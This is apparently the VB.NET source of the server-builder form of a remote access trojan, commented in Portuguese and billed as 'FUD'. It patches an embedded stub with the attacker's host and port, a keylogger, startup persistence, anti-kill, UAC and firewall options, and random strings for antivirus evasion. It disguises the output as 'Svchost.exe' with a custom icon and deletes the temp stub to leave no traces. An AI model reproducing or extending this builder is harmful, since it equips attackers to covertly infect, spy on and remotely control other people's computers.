Imports System
Imports System.Text
Imports System.IO
Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System.CodeDom.Compiler
Imports Microsoft.VisualBasic
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.Binding


'Coded Pjoao1578
'Random Strings Fud Mario e Pjoao1578
'v7
Public Class Server
#Region "Server normal"
    Dim stub As String 'Stub
    Dim text4, text1, text2, text3, text5, text6, text7 As String 'add porta e host  ou ip e nome do aranque do windows e sleep e nome do forme do server e rodom as strigs
    Const spl = "MicrosoftCorporationSvchost" 'senha da bilder com a stub se for mudada tem que mudar na stub tambem 
    Dim ver As String = "icon, 2,6" 'vercion do server criado
#End Region

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        'activer rondom
        If Me.CheckBox2.Checked = True Then
            Me.Timer2.Start() 'start
        Else
            Me.Timer2.Stop() 'stop
            Me.Timer2.Enabled = False 'false
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 50
        'activer rondom
        For i = 0 To 15 'rodom strings
            Application.DoEvents()
            Me.TextBox7.Text = RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick 'interval 1000
        For i = 0 To 15 'rodom strings
            Threading.Thread.Sleep(15) 'sleep 15
            Application.DoEvents()
            TextBox7.Text = RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
        Me.Timer1.Stop() 'stop rodom strings
    End Sub

    Private Sub Server_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Me.NumericUpDown2.Value = Form1.NumericUpDown1.Value 'NumericUpDown2 = a porta do rat
            Me.Timer1.Start() 'rodom strings
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        Dim temp As String = IO.Path.GetTempPath() & "Microsoft.exe" 'chamar stub pra fazer o server e nome da stub
        Dim dialog As New SaveFileDialog
        dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        dialog.Filter = "Server EXE|*.exe" 'salvar como .exe
        dialog.FileName = "Svchost" 'nome sugerido ao executavel
        If (dialog.ShowDialog = DialogResult.OK) Then
            text1 = Me.TextBox1.Text 'host
            text2 = Me.NumericUpDown2.Value 'NumericUpDown2 = a porta do rat
            text3 = Me.TextBox3.Text 'add nome do aranque do windows
            text5 = Me.TextBox5.Text 'ID User
            text4 = Me.NumericUpDown3.Value 'sleep
            text6 = Me.TextBox6.Text 'name de forme do server
            text7 = Me.TextBox7.Text 'rodom as strigs 
            IO.File.WriteAllBytes(temp, My.Resources.Microsoft) 'procurar stub na Resources do rat/stub Microsoft
            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space$(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            Try
                FileOpen(1, dialog.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                'add stub porta host ou ip e nome e add ao aranque do windows e sleep e hide executavel e nome do forme do server add startup
                FilePut(1, stub & spl & Me.text4 & spl & text1 & spl & text2 & spl & text3 & spl & Me.hidme.CheckState & spl &
                Me.addwindows.CheckState & spl & text5 & spl & Me.keyloger.CheckState & spl & text6 & spl & Me.addwindows2.CheckState &
                spl & Me.Startup.CheckState & spl & Me.antikill.CheckState & spl & Me.UAC.CheckState & spl &
                Me.firewall.CheckState & spl & text7 & spl) 'tem que estar na ordem igual a da stub ou vai da erro / text7 rodom strings 
                FileClose(1)
                'icone
                IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
                If Not PictureBox5.Image Is Nothing Then
                    Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & dialog.FileName & ", " & dialog.FileName & ", " & Me.PictureBox5.Tag.ToString & ", " & ver, AppWinStyle.Hide)
                End If
                MsgBox("   O Server Foi Criado", MessageBoxIcon.Asterisk) 'mensagem de server criado
                If Me.CheckBox3.Checked = True Then
                    Me.Close()
                Else

                End If
            Catch ex As Exception
                MsgBox("   Erro !! Esse Arquivo Não Pode ser Substituido", MessageBoxIcon.Error) 'mensagem
                Form1.ListBox1.Items.Add("Erro Ao Fazer o Server !")
            End Try
        End If
        Try 'obrigatorio o Try / ou ira dar erro
            My.Computer.FileSystem.DeleteFile(temp) 'deletar Stub que vai pra pasta Temp nao e utilisada para que nao fique rastros do server ou stub 
        Catch ex As Exception 'erro nao report 
        End Try
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked = True Then 'esconder texto ao digitar
            Me.TextBox1.PasswordChar = "?"
        Else
            Me.TextBox1.PasswordChar = String.Empty
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For i = 0 To 15 'rodom strings
            Threading.Thread.Sleep(15) 'sleep 15
            Application.DoEvents()
            Me.TextBox7.Text = RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
    End Sub

    Public Function RandomString1(ByVal longitud As Integer) As String 'rodom strings
        Dim cadena As String = "ییاခంںیငమ☺☻♥♦♣♠•↕‼¶∟↔▲▼ااabcdefghijklmnopq0123456789rsuvwxyzABCDEFGHIJKLMN123456789PQRSTUVWXYZ0123456789"

        Dim r As New Random
        Dim l As Integer
        Dim sb As New System.Text.StringBuilder
        For i = 1 To longitud
            l = r.Next(0, 62)
            Try
                sb.Append(cadena.Substring(l, 1))
            Catch ex As Exception 'erro nao report
                MsgBox("   Erro !! Random As Strings", MessageBoxIcon.Error) 'mensagem
                Form1.ListBox1.Items.Add("Erro Ao Fazer o Server !")
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        Next

        Return sb.ToString()
    End Function

    Private Sub Server_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Me.Timer1.Stop()
        Me.Timer1.Enabled = False
    End Sub

    Private Sub Server_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Me.Timer1.Stop()
        Me.Timer1.Enabled = False
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            Me.PictureBox5.Image = Image.FromFile(ofd.FileName) : Me.PictureBox5.Tag = ofd.FileName
        End If
    End Sub
End Class